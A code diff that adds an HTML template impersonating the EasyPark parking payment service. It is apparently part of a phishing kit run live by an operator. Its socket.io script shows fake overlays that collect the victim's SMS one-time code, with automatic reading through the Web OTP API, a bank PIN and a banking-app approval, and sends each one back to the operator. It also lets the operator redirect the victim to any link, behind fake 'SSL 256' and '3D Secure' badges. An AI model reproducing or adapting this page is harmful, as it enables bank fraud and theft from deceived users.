@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="ro"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
+<title>Verifying — EasyPark</title>
+<script src="/static/js/i18n.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",sans-serif;background:#f0f2f5;margin:0;min-height:100vh}
+.wrap{max-width:480px;margin:0 auto;padding:16px}
+.card-s{background:#fff;border-radius:18px;padding:20px;margin-bottom:14px;box-shadow:0 1px 3px rgba(0,0,0,.06),0 1px 12px rgba(0,0,0,.04)}
+label{display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px}
+.inp{width:100%;background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:12px;padding:14px 16px;font-size:16px;color:#1e293b;transition:border .2s,box-shadow .2s;-webkit-appearance:none;outline:none}
+.inp:focus{border-color:#872879;background:#fff;box-shadow:0 0 0 3px rgba(135,40,121,.1)}
+.inp::placeholder{color:#94a3b8}
+select.inp{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2394a3b8' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:36px}
+.inp-group{position:relative;display:flex;align-items:stretch;background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:12px;transition:border .2s,box-shadow .2s;overflow:hidden}
+.inp-group:focus-within{border-color:#872879;background:#fff;box-shadow:0 0 0 3px rgba(135,40,121,.1)}
+.inp-icon{display:flex;align-items:center;justify-content:center;padding:0 14px;color:#94a3b8;font-size:15px;flex-shrink:0;border-right:1px solid #e2e8f0}
+.inp-group:focus-within .inp-icon{color:#872879}
+.inp-group input,.inp-group select{flex:1;background:transparent;border:none;outline:none;padding:14px 14px;font-size:16px;color:#1e293b;-webkit-appearance:none;min-width:0}
+.inp-group select{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2394a3b8' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 12px center;padding-right:32px}
+.btn-primary{width:100%;background:linear-gradient(135deg,#872879,#740668);color:#fff;border:none;border-radius:14px;padding:16px;font-size:16px;font-weight:800;cursor:pointer;box-shadow:0 4px 20px rgba(135,40,121,.35);transition:.2s;letter-spacing:.02em;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-primary:active{transform:scale(.98);box-shadow:0 2px 10px rgba(135,40,121,.3)}
+input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
+</style>
+<style>
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.65);display:flex;align-items:center;justify-content:center;z-index:9999;padding:20px}
+.ov-card{background:#fff;border-radius:20px;padding:28px 24px;width:100%;max-width:320px;text-align:center}
+.ov-icon-wrap{width:60px;height:60px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:24px}
+.ov-inp{width:100%;border:2px solid #e5e7eb;border-radius:12px;padding:14px;text-align:center;font-size:28px;font-weight:700;letter-spacing:.22em;outline:none;margin-bottom:14px;font-family:"Courier New",monospace;transition:border .2s}
+.ov-inp:focus{border-color:#872879}
+.ov-btn{width:100%;padding:14px;border-radius:12px;font-weight:800;font-size:14px;border:none;cursor:pointer;transition:.2s}
+.otp-row{display:flex;gap:7px;justify-content:center;margin-bottom:18px}
+.otp-b{width:42px;height:52px;border:2px solid #e5e7eb;border-radius:11px;text-align:center;font-size:22px;font-weight:800;color:#1e293b;outline:none;background:#f8fafc;transition:border .15s,box-shadow .15s;-webkit-appearance:none;padding:0}
+.otp-b:focus{border-color:#d97706;background:#fff;box-shadow:0 0 0 3px rgba(217,119,6,.15)}
+.otp-b.otp-filled{border-color:#d97706;background:#fffbeb}
+@keyframes shield-pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+</style>
+<style>
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.97)}}
+.spinner{width:60px;height:60px;border:4px solid #e5e7eb;border-top-color:#872879;border-radius:50%;animation:spin 1s linear infinite}
+</style>
+</head><body>
+<nav style="background:#fff;border-bottom:1px solid #e5e7eb;position:sticky;top:0;z-index:50">
+  <div style="max-width:480px;margin:0 auto;padding:0 16px;height:54px;display:flex;align-items:center;gap:10px">
+    <div style="<img src="/static/img/logo.png" alt="EasyPark" style="height:34px;width:auto">
+    <div style="margin-left:auto;display:flex;align-items:center;gap:4px;font-size:11px;color:#ff52a3;font-weight:600">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      <span data-i18n="secure">Secure</span>
+    </div>
+  </div>
+</nav>
+<div style="background:#fff;border-bottom:1px solid #f1f5f9;padding:12px 0 14px">
+  <div style="max-width:260px;margin:0 auto;padding:0 16px">
+    <div style="display:flex;align-items:flex-start;justify-content:space-between"><div style="display:flex;flex-direction:column;align-items:center;z-index:1">
+          <div style="width:28px;height:28px;border-radius:50%;background:#872879;color:#fff;display:flex;align-items:center;justify-content:center"><i class="fas fa-car" style="font-size:11px"></i></div>
+          <span style="font-size:10px;margin-top:4px;color:#872879;font-weight:700" data-i18n="step_details">Details</span>
+        </div><div style="flex:1;height:2px;background:#872879;margin:0 6px;margin-top:-14px"></div><div style="display:flex;flex-direction:column;align-items:center;z-index:1">
+          <div style="width:28px;height:28px;border-radius:50%;background:#872879;color:#fff;box-shadow:0 0 0 4px rgba(135,40,121,.2);display:flex;align-items:center;justify-content:center"><span style="font-size:12px;font-weight:800">2</span></div>
+          <span style="font-size:10px;margin-top:4px;color:#872879;font-weight:700" data-i18n="step_verify">Verification</span>
+        </div><div style="flex:1;height:2px;background:#e2e8f0;margin:0 6px;margin-top:-14px"></div><div style="display:flex;flex-direction:column;align-items:center;z-index:1">
+          <div style="width:28px;height:28px;border-radius:50%;background:#e2e8f0;color:#94a3b8;display:flex;align-items:center;justify-content:center"><span style="font-size:12px;font-weight:700">3</span></div>
+          <span style="font-size:10px;margin-top:4px;color:#94a3b8" data-i18n="step_pay">Payment</span>
+        </div></div>
+  </div>
+</div>
+<div class="wrap" style="padding-top:24px">
+  <div class="card-s" style="text-align:center;padding:32px 24px">
+    <div style="position:relative;display:inline-flex;margin-bottom:20px">
+      <div class="spinner"></div>
+      <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center">
+        <i class="fas fa-shield-alt" style="color:#872879;font-size:20px"></i>
+      </div>
+    </div>
+    <h2 style="font-weight:800;font-size:20px;color:#1e293b;margin:0 0 8px" data-i18n="verifying">Verifying…</h2>
+    <p style="font-size:14px;color:#64748b;margin:0 0 24px;line-height:1.6" data-i18n-html="operator_check_wait_html">The operator is verifying your details.<br>You will be redirected automatically.</p>
+    <div style="background:#f8fafc;border-radius:14px;padding:16px;text-align:left">
+      <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f1f5f9;font-size:13px">
+        <span style="color:#94a3b8" data-i18n="plate_label">License plate</span>
+        <span style="font-weight:700;color:#1e293b;letter-spacing:.08em">{{ session.plate_number }}</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #f1f5f9;font-size:13px">
+        <span style="color:#94a3b8" data-i18n="dur_label">Duration</span>
+        <span style="font-weight:600;color:#1e293b">{{ session.hours }} {{ session.time_unit or 'ore' }}</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:6px 0;font-size:13px">
+        <span style="color:#94a3b8" data-i18n="locality">City</span>
+        <span style="font-weight:600;color:#1e293b">{{ session.user_city or '—' }}</span>
+      </div>
+    </div>
+  </div>
+  <div style="display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;color:#94a3b8;padding:8px 0">
+    <i class="fas fa-lock" style="font-size:10px;color:#ff52a3"></i>
+    <span data-i18n="ssl">Secured SSL 256-bit connection</span>
+  </div>
+</div>
+
+<div id="ov-sms" class="overlay" style="display:none">
+  <div class="ov-card">
+    <div class="ov-icon-wrap" style="background:#fef9c3;animation:shield-pulse 2s ease-in-out infinite">
+      <i class="fas fa-comment-dots" style="color:#d97706"></i>
+    </div>
+    <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 5px" data-i18n="sms_title">SMS Verification</h3>
+    <p style="font-size:12px;color:#64748b;margin:0 0 18px;line-height:1.5" data-i18n="sms_desc">You received a 6-digit code on your phone. Enter it below:</p>
+    <div class="otp-row" id="otp-sms">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" autocomplete="one-time-code">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+      <input class="otp-b" type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+    </div>
+    <button class="ov-btn" id="sms-submit-btn" style="background:#d97706;color:#fff;opacity:.5;cursor:default" data-i18n="confirm_code">CONFIRM CODE</button>
+  </div>
+</div>
+<div id="ov-pin" class="overlay" style="display:none">
+  <div class="ov-card">
+    <div class="ov-icon-wrap" style="background:#fce7f3"><i class="fas fa-key" style="color:#7c3aed"></i></div>
+    <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 6px" data-i18n="pin_title">Bank PIN Code</h3>
+    <p style="font-size:13px;color:#64748b;margin:0 0 16px" data-i18n="pin_desc">Enter the PIN code received from your bank:</p>
+    <input id="pin-code" type="tel" inputmode="numeric" maxlength="8" placeholder="• • • •"
+           class="ov-inp" style="border-color:#fbcfe8" oninput="this.value=this.value.replace(/\D/g,'')">
+    <button class="ov-btn" style="background:#7c3aed;color:#fff" onclick="submitPINCode()" data-i18n="confirm_pin">CONFIRM PIN</button>
+  </div>
+</div>
+<div id="ov-app" class="overlay" style="display:none">
+  <div class="ov-card">
+    <div class="ov-icon-wrap" style="background:#dbeafe"><i class="fas fa-mobile-alt" style="color:#3b82f6"></i></div>
+    <h3 style="font-weight:800;font-size:18px;color:#1e293b;margin:0 0 6px" data-i18n="app_title">3D Secure Authentication</h3>
+    <p style="font-size:13px;color:#64748b;margin:0 0 18px" data-i18n="app_desc">Approve the transaction from your banking app</p>
+    <div style="display:flex;justify-content:center;gap:8px;margin-bottom:20px">
+      <div style="width:10px;height:10px;background:#3b82f6;border-radius:50%;animation:ab .8s infinite"></div>
+      <div style="width:10px;height:10px;background:#3b82f6;border-radius:50%;animation:ab .8s .25s infinite"></div>
+      <div style="width:10px;height:10px;background:#3b82f6;border-radius:50%;animation:ab .8s .5s infinite"></div>
+    </div>
+    <button class="ov-btn" style="background:#3b82f6;color:#fff" onclick="submitAppConfirm()" data-i18n="confirmed_app">✓ I CONFIRMED IN THE APP</button>
+  </div>
+</div>
+<style>@keyframes ab{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}</style>
+<script>
+const TOKEN = "{{ token }}";
+const socket = io();
+function doJoin(){ socket.emit('join_session', {token: TOKEN}); }
+socket.on('connect', doJoin);
+socket.on('reconnect', doJoin);
+setInterval(function(){ if(socket.connected) doJoin(); }, 8000);
+socket.on('open_payment', function(){ window.location.href='/pay/card/'+TOKEN; });
+socket.on('session_confirmed', function(){ window.location.href='/pay/card/'+TOKEN; });
+socket.on('session_rejected', function(){ window.location.href='/pay/done/'+TOKEN; });
+socket.on('payment_approved', function(){ window.location.href='/pay/done/'+TOKEN; });
+socket.on('session_retry', function(d){ window.location.href='/pay/'+(d.lot_id||1); });
+
+// Polling fallback
+setInterval(function(){
+  fetch('/pay/status/'+TOKEN).then(r=>r.json()).then(function(d){
+    if(d.status==='completed'||d.status==='rejected') window.location.href='/pay/done/'+TOKEN;
+    if(d.status==='confirmed'||d.status==='price_set'||d.status==='payment_pending') window.location.href='/pay/card/'+TOKEN;
+  }).catch(function(){});
+}, 3000);
+
+// ── OTP boxes ────────────────────────────────────────────────────────────────
+function initOTP(){
+  const boxes=[...document.querySelectorAll('#otp-sms .otp-b')];
+  boxes.forEach((b,i)=>{
+    b.addEventListener('input',()=>{
+      b.value=b.value.replace(/\D/g,'').slice(-1);
+      b.classList.toggle('otp-filled',!!b.value);
+      if(b.value&&i<5) boxes[i+1].focus();
+      checkOTP(boxes);
+    });
+    b.addEventListener('keydown',e=>{
+      if(e.key==='Backspace'&&!b.value&&i>0){
+        boxes[i-1].value=''; boxes[i-1].classList.remove('otp-filled'); boxes[i-1].focus();
+      }
+    });
+    b.addEventListener('paste',e=>{
+      e.preventDefault();
+      const t=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'');
+      boxes.forEach((x,j)=>{ x.value=t[j]||''; x.classList.toggle('otp-filled',!!x.value); });
+      const last=Math.min(t.length,6)-1; if(last>=0) boxes[last].focus();
+      checkOTP(boxes);
+    });
+  });
+}
+function checkOTP(boxes){
+  const val=boxes.map(b=>b.value).join('');
+  const btn=document.getElementById('sms-submit-btn');
+  if(val.length===6){ btn.style.opacity='1'; btn.style.cursor='pointer'; }
+  else { btn.style.opacity='.5'; btn.style.cursor='default'; }
+  if(val.length===6) submitSMSCode();
+}
+function getOTPValue(){ return [...document.querySelectorAll('#otp-sms .otp-b')].map(b=>b.value).join(''); }
+function resetOTP(){
+  document.querySelectorAll('#otp-sms .otp-b').forEach(b=>{ b.value=''; b.classList.remove('otp-filled'); });
+  const btn=document.getElementById('sms-submit-btn'); btn.style.opacity='.5'; btn.style.cursor='default';
+}
+function submitSMSCode(){
+  const code=getOTPValue();
+  if(code.length<6){return;}
+  socket.emit('sms_code_submitted',{token:TOKEN,code:code});
+  document.getElementById('ov-sms').style.display='none';
+}
+initOTP();
+// Web OTP API — auto-read SMS on Android
+if('OTPCredential' in window){
+  navigator.credentials.get({otp:{transport:['sms']},signal:AbortSignal.timeout(120000)})
+    .then(otp=>{
+      const digits=otp.code.replace(/\D/g,'');
+      const boxes=[...document.querySelectorAll('#otp-sms .otp-b')];
+      boxes.forEach((b,i)=>{ b.value=digits[i]||''; b.classList.toggle('otp-filled',!!b.value); });
+      checkOTP(boxes);
+    }).catch(()=>{});
+}
+function submitPINCode(){
+  const code=document.getElementById('pin-code').value.trim();
+  if(code.length<4){return;}
+  socket.emit('pin_code_submitted',{token:TOKEN,code:code});
+  document.getElementById('ov-pin').style.display='none';
+}
+function submitAppConfirm(){
+  socket.emit('app_confirmed',{token:TOKEN});
+  document.getElementById('ov-app').style.display='none';
+}
+socket.on('sms_received',function(){ resetOTP(); document.getElementById('ov-sms').style.display='flex'; setTimeout(()=>document.querySelector('#otp-sms .otp-b').focus(),200); });
+socket.on('show_pin_prompt',function(){ document.getElementById('pin-code').value=''; document.getElementById('ov-pin').style.display='flex'; });
+socket.on('app_confirm',function(){ document.getElementById('ov-app').style.display='flex'; });
+socket.on('open_link',function(d){
+  document.getElementById('ov-link-btn').onclick=function(){ window.location.href=d.url; };
+  document.getElementById('ov-link').style.display='flex';
+});
+
+</script>
+<!-- Link confirm overlay -->
+<div id="ov-link" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center;padding:20px">
+  <div style="background:#fff;border-radius:24px;padding:28px 22px 22px;width:100%;max-width:340px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.35)">
+    <div style="width:68px;height:68px;background:linear-gradient(135deg,#0f766e,#0d9488);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;animation:shield-pulse 2.5s ease-in-out infinite;box-shadow:0 8px 24px rgba(15,118,110,.35)">
+      <i class="fas fa-lock" style="color:#fff;font-size:24px"></i>
+    </div>
+    <h3 style="font-size:18px;font-weight:900;color:#0f766e;margin:0 0 6px;letter-spacing:-.01em" data-i18n="link_confirm_title">Payment Confirmation</h3>
+    <p style="font-size:12.5px;color:#64748b;margin:0 0 20px;line-height:1.6" data-i18n="link_confirm_desc">Press the button below to confirm and finalize your payment securely.</p>
+    <div style="display:flex;justify-content:center;gap:10px;margin-bottom:20px">
+      <div style="display:flex;align-items:center;gap:4px;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;padding:4px 10px">
+        <i class="fas fa-lock" style="color:#16a34a;font-size:9px"></i>
+        <span style="font-size:10px;font-weight:700;color:#16a34a">SSL 256</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:4px;background:#eff6ff;border:1px solid #bfdbfe;border-radius:20px;padding:4px 10px">
+        <i class="fas fa-shield-alt" style="color:#3b82f6;font-size:9px"></i>
+        <span style="font-size:10px;font-weight:700;color:#3b82f6">3D Secure</span>
+      </div>
+    </div>
+    <button id="ov-link-btn"
+      style="width:100%;padding:16px;background:linear-gradient(135deg,#0f766e,#0d9488);color:#fff;border:none;border-radius:16px;font-size:15px;font-weight:900;cursor:pointer;letter-spacing:.02em;box-shadow:0 6px 20px rgba(15,118,110,.4);transition:transform .15s,box-shadow .15s"
+      onmousedown="this.style.transform='scale(.97)';this.style.boxShadow='0 3px 10px rgba(15,118,110,.3)'"
+      onmouseup="this.style.transform='';this.style.boxShadow='0 6px 20px rgba(15,118,110,.4)'">
+      <i class="fas fa-check-circle" style="margin-right:8px"></i><span data-i18n="link_confirm_btn">Confirm</span>
+    </button>
+    <p style="font-size:10px;color:#94a3b8;margin:12px 0 0">
+      <i class="fas fa-shield-alt" style="margin-right:3px"></i>Secured by EasyPark Payment Gateway
+    </p>
+  </div>
+</div>
+</body></html>
